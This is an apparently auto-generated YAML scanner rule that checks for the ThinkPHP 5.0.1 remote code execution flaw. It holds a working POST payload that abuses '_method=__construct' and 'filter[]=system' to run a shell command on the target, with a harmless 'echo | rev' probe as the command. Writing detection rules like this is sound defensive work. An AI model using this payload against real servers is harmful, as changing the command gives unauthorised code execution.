schema_version: 1
id: "cortex.community:thinkphp-501-rce"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "ThinkPHP 5.0.1 - Remote Code Execution"
  description: "ThinkPHP 5.0.1 allows remote unauthenticated attackers to execute arbitrary code via the 's' parameter. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/46150"
  cwes: [78]
  tags: ["edb", "thinkphp", "rce", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Critical"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request:
      method: "POST"
      path: "/?s=index/index/index"
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
      body: "s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system"
proof:
  kind: "signal.v1"
  assertions:
    all:
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "phpkniht" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
